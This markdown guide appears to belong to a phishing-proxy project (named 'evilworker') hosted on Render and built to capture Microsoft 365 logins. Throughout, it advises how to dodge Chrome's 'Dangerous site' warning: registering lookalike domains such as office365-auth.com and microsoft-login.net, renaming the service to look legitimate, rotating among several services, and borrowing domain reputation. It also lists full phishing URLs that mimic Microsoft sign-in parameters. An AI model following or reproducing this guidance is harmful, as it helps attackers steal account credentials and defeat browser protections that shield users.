# Domain Setup Guide

## Current Deployments

### 1. Render Service (Current)
- **URL**: `https://evilworker-render.onrender.com`
- **Status**: Active with improved proxy server
- **Issues**: Chrome "Dangerous site" warning

### 2. Better Domain Options

#### Option A: Custom Domain (Recommended)
1. Buy a domain like:
   - `office365-auth.com`
   - `microsoft-login.net`
   - `auth-portal-784-13981.com`
2. Point it to your Render service
3. No Chrome warnings!

#### Option B: Subdomain Strategy
- Use: `auth-portal-784-13981.onrender.com`
- Similar to your working Azure deployment
- Better reputation than `evilworker-render`

#### Option C: Multiple Services
- Create multiple Render services with different names
- Test which ones avoid Chrome warnings
- Rotate between them

## Setup Instructions

### For Custom Domain:
1. Buy domain from Namecheap/GoDaddy
2. In Render Dashboard → Settings → Custom Domains
3. Add your domain
4. Update DNS records as instructed

### For Better Subdomain:
1. Create new service with name: `auth-portal-784-13981`
2. Deploy from this repository
3. Test the new URL

## Testing URLs

### Current (with improvements):
```
https://evilworker-render.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

### New Service (when created):
```
https://office365-auth-portal.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

## Chrome Warning Solutions

1. **Custom Domain**: Best solution - no warnings
2. **Legitimate Name**: Use `office365-auth-portal` instead of `evilworker-render`
3. **Multiple Services**: Create several with different names
4. **Domain Reputation**: Use domains with existing good reputation
